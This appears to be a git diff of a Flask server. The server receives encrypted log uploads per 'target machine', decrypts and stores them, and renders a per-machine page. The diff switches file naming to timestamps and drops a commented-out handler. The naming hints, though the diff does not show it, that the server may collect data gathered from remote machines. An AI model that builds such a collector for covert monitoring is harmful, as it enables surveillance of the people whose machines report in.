@@ -21,6 +21,11 @@ data_list = []
 def home():
     return render_template("WebsiteView.html")
 
+@app.route("/individualUinit.html")
+def individual_unit():
+    machine_name = request.args.get("machine_name")
+    return render_template("individualUinit.html", machine_name=machine_name)
+
 
 @app.route("/api/getTargetMachinesList", methods=["GET"])
 def get_target_machines_list():
@@ -45,19 +50,6 @@ def get_data(machine):
     return jsonify(data_objects), 200
 
 
-# @app.route("/api/upload", methods=["POST"])
-# def upload_api():
-#     data = request.get_json()
-#     if not data or "machine" not in data or "data" not in data: 
-#         return jsonify({"error": "Invalid payload"}), 400
-#     upload(data)
-    
-#     # data_list.append(data)
-#     print("Current data list:", data_list)
-#     # return toggle_api()
-#     return jsonify({"status": "success"}), 200
-
-
 @app.route("/api/upload", methods=["POST"])
 def upload_api():
     data = request.get_data()
@@ -70,7 +62,7 @@ def upload_api():
     os.makedirs(machine_path, exist_ok=True)
     os.makedirs(decrypted_machine_path, exist_ok=True)
 
-    file_name = f"log_{len(os.listdir(machine_path)) + 1}.enc"
+    file_name = f"log_{time.strftime('%Y-%m-%d_%H:%M:%S')}.enc"
     file_path = os.path.join(machine_path, file_name)
 
     with open(file_path, "wb") as f:
@@ -81,7 +73,7 @@ def upload_api():
         decrypted_json = json.loads(decrypted_data)
         data_list.append(decrypted_json)
 
-        decrypted_file_name = f"log_{len(os.listdir(decrypted_machine_path)) + 1}.json"
+        decrypted_file_name = f"log_{time.strftime('%Y-%m-%d_%H:%M:%S')}.json"
         decrypted_file_path = os.path.join(decrypted_machine_path, decrypted_file_name)
         with open(decrypted_file_path, "w", encoding="utf-8") as f:
             json.dump(decrypted_json, f, indent=2, ensure_ascii=False)
